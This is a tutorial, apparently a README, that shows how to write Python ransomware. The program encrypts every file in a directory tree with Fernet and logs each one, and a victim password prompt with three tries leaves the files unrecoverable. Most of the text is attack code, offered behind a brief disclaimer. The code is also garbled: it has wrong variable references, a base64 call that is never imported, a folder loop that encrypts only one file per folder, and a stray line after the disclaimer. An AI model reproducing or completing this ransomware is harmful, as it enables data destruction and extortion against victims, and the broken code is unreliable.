# Ransomeware and how it woks

Ransomeware is a type of malware that will encrypt every file it can get to, which can be devastating if the code gets to the main directory.

We'll use the os and sys modules to find all the files in the current directory and the ones in its subdirectories,
the fernet module to actually encrypt the files,
and the logging module to record everything.

```
import os, sys
import logging
from cryptography.fernet import Fernet
```
*Note: The logging module and the cryptography module will have to be installed*

*You can install them using*
```
$ pip install cryptography
$ pip install logging
```

We'll define a ransomeware class that will do all the encrypting

`class Ransomeware:`

First, in order to 

In order to actually encrypt the files,
we'll need to define a key and a fernet object
and gather the files in the directory
```
self.key = Fernet.generate_key()
self.fernet = Fernet(key)
self.files = os.listdir()
```

Normally, we'll need to save the key to a file, 
but if we add some passwords that when entered will decrypt the files,
we do not have to save the key to a file

```
self.keys = ['fuschia', 'rambunctious', 'serendipity']
```

The advantage of using passwords over saving a key to a file,
is that realistically, when you do something like use base64
to encrypt your files or save a key to a file, they can just 
use an online decrypter for base64 or fernet with the provided key.

Using passwords instead of saving or anything else, along with
encrypting the encrypter file itself means that they cannot access
the key and cannot decrypt it since we're using a unique key.

We'll need to write a function to accept the keys though.

In that class, we'll define some functions that will encrypt the files and the ones in the subdirectories

```
def Encrypt(self, file):
  --snip--

def FileEncrypt(self):
  --snip--
  
def FolderEncrypt(self)
  --snip--
 ```
 
 The Encrypt function will take a file, read and encrypt its content, then write it to the files.
 The FileEncrypt function will find every file in the directory and feed them to the Encrypt function to be encrypted.
 The FolderEncrypt function goes through every folder in that directory and every file in that folder and encrypts them
 
 The Encrypt function reads the file it's been given,
 reads and encrypts its content, logs it, 
 then writes the encrypted content to the file

```
 with open(file, 'rb') as file_name:
  Content = file_name.read()
  EncryptedContent = fernet.encrypt(Content)
  logging.info(f"File {file} has been encrypted")
  
  with open(file, 'wb') as file_name:
    file_name.write(EncryptedContent)
  ```

The FileEncrypt function goes through every file in its folder,
checks if it is actually a file or a folder, then if it is a file,
it feeds it into the Encrypt function. If not, then it adds it to
the EncyrFolder list, which is all the folders that will be encrypted by the FolderEncrypt function

```
for file in self.files:
  if os.path.isfile(file):
    self.Encrypt(file)
  else:
    self.Encryfolders.append(file)
```

The FolderEncrypt function rather then recursively go through every file and folder in the subdirectories, it uses the os.walk function which does it for it. It cannot use the Encrypt function though, seeing that the path is different

```
for folder in self.Encryfolders:
  for path, foldername, filename in os.walk(folder):
  with open(f'{path}\\{filename[0]}', "rb") as file:
    Content = file.read()
    EncryptedContent = base64.b64encode(Content)
  with open(f'{path}\\{filename[0]}', "wb") as file:
    file.write(EncryptedContent)
```

The Decrypt functions are basically the same except the words encrypt has been replaced with decrypt

The initEncrypt and initDecrypt functions run the FileEncrypt and Folder Encrypt functions and the Decrypt versions for initDecrypt.

The startDecrypt function ask the victim for the key,
and if it is not one of the keys in self.keys, after three tries it shutsdown and the files cannot be decrypted, seeing that the encryption file is also decrypted

```
def startDecrypt(self):
		for i in range(3):
			key = input('Enter key: ')
			if key != self.keys[i]:
				print("Key is incorrect\nIt has been changed")
			else:
				self.initDecrypt()
				break
```

**DISCLAIMER: DO NOT USE FOR MALICIOUS PURPOSES**

Do not run in a folder with any important files.
logging.info(f'File {filename[0]} has been encrypted')
